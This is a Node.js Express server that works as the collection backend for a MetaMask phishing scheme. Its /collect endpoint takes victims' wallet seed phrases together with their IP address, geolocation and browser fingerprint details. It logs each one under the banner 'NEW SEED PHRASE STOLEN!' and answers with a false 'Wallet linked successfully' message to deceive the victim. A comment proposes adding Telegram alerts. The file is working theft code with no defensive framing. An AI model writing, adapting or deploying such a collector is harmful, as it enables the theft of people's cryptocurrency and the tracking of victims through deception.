const express = require('express');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

app.post('/collect', (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
    const geo = geoip.lookup(ip) || {};

    const logEntry = {
        timestamp: new Date().toISOString(),
        seed: data.seed,
        ip: ip,
        geo: `${geo.country || '??'} ${geo.city || ''}`,
        userAgent: data.userAgent,
        platform: data.platform,
        screen: data.screen,
        timezone: data.timezone,
        hardware: data.hardwareConcurrency,
        fullData: data
    };

    console.log('💰 NEW SEED PHRASE STOLEN!');
    console.log(JSON.stringify(logEntry, null, 2));

    // You can add Telegram notification here later if you want instant alerts

    res.status(200).json({ status: "connected", message: "Wallet linked successfully" });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🚀 MetaMask collector running on port ${port}`);
});
